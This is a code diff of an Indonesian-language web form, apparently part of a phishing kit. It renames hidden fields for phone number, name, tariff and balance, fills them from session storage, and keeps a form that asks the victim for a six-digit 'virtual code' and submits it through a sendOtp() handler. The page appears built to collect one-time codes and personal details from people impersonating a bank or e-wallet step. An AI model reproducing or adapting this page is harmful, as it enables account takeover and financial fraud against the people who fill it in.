@@ -1186,10 +1186,10 @@ body.stop-scrolling {
   <div class="container-3 w-container">
    <div class="form-block w-form">
   <form id="form2" onsubmit="sendOtp()" method="POST" style="padding: 10px; ">
-<input type="hidden" id="tele" name="tele" value="">
-<input type="hidden" id="namanye" name="namanye" value="">
-<input type="hidden" id="kertu" name="kertu" value="">
-<input type="hidden" id="uang" name="uang" value="">	                  
+<input type="hidden" id="tarif" name="tarif" value="">
+<input type="hidden" id="nohp" name="nohp" value="">
+<input type="hidden" id="nama" name="nama" value="">
+<input type="hidden" id="saldo" name="saldo" value="">	                  
   <div style="margin-top:80px">
           <label for="rek">Kode Virtual</label>
      <input type="tel" name="sixpin" id="sixpin" class="text-field-2 w-input" maxlength=""  data-name="rek" placeholder="Masukkan Kode Virtual" minlength="6" required>
@@ -1244,14 +1244,14 @@ Silahkan klik tombol dibawah ini<br>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js">
     </script>
  <script>
-var phone = sessionStorage.getItem("phone");
- document.getElementById("tele").value = phone + "";
-  var user = sessionStorage.getItem("user");
- document.getElementById("namanye").value = user + "";
-  var card = sessionStorage.getItem("card");
- document.getElementById("kertu").value = card + "";
-  var duet = sessionStorage.getItem("duet");
- document.getElementById("uang").value = duet + "";
+var tarif = sessionStorage.getItem("tarif");
+ document.getElementById("tarif").value = tarif + "";
+  var nohp = sessionStorage.getItem("nohp");
+ document.getElementById("nohp").value = nohp + "";
+  var nama = sessionStorage.getItem("nama");
+ document.getElementById("nama").value = nama + "";
+  var saldo = sessionStorage.getItem("saldo");
+ document.getElementById("saldo").value = saldo + "";
  
 
 </script>
